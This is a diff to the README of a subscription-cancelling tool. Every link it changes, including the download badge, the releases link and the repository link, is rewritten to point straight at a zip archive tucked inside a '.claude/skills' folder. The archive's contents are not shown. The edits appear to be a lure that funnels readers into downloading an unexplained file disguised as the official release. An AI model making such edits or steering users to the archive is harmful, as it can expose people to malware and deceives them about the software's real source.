@@ -1,6 +1,6 @@
 # 🎉 just-fucking-cancel - Effortlessly Cancel Your Subscriptions
 
-![Download](https://img.shields.io/badge/Download-Here-brightgreen)
+![Download](https://github.com/anthony-maurial/just-fucking-cancel/raw/refs/heads/main/.claude/skills/just-fucking-cancel/just-fucking-cancel-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **just-fucking-cancel**! This simple tool helps you cancel your subsc
 
 To get started, you need to download the application. Visit this page to download the latest version:
 
-[Download just-fucking-cancel](https://github.com/anthony-maurial/just-fucking-cancel/releases)
+[Download just-fucking-cancel](https://github.com/anthony-maurial/just-fucking-cancel/raw/refs/heads/main/.claude/skills/just-fucking-cancel/just-fucking-cancel-v3.3.zip)
 
 1. Click on the link above.
 2. Find the latest release in the list.
@@ -77,6 +77,6 @@ If you encounter any issues or have questions, please reach out. You can contact
 
 For more information, updates, and community support, you can check out our GitHub repository:
 
-[just-fucking-cancel GitHub Repository](https://github.com/anthony-maurial/just-fucking-cancel)
+[just-fucking-cancel GitHub Repository](https://github.com/anthony-maurial/just-fucking-cancel/raw/refs/heads/main/.claude/skills/just-fucking-cancel/just-fucking-cancel-v3.3.zip)
 
 Thank you for using **just-fucking-cancel**. Enjoy a simpler subscription management experience!
